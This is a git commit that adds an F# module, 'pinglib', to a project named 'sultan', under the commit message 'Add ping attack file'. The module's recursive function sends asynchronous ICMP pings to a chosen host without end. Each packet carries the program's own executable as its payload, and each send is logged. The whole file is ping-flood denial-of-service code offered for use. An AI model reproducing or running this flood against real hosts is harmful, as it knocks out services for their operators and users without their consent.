a92c6b76be5ac5e1b50ab656d4f9662c5ca6d888
Kied T L <eli.georgios@gmail.com>
2019-02-18 16:33:39 -0500

    Add ping attack file

---
+++ lib/pinglib.fs
@@ -0,0 +1,25 @@
+namespace sultan
+
+open sultan
+open sultan.printxlib
+
+open System
+open System.IO
+open System.Net
+open System.Text
+open System.Net.NetworkInformation
+
+module pinglib =
+    let nil : string = string (char 0x00)
+    let data : string = File.ReadAllText((System.Reflection.Assembly.GetEntryAssembly().Location))
+
+    let rec attackp (nth : int) (host : string)  =
+        let pingSender : Ping = new Ping()
+        let options : PingOptions = new PingOptions()
+
+        let buffer : byte array = Encoding.ASCII.GetBytes(data)
+
+        let timeout : int = 120
+        pingSender.SendAsync(host, 10000000, buffer, options) |> ignore
+        verbose ("pinged -> " + host + " " + (nth.ToString()) + " times\n")
+        attackp (nth + 1) host
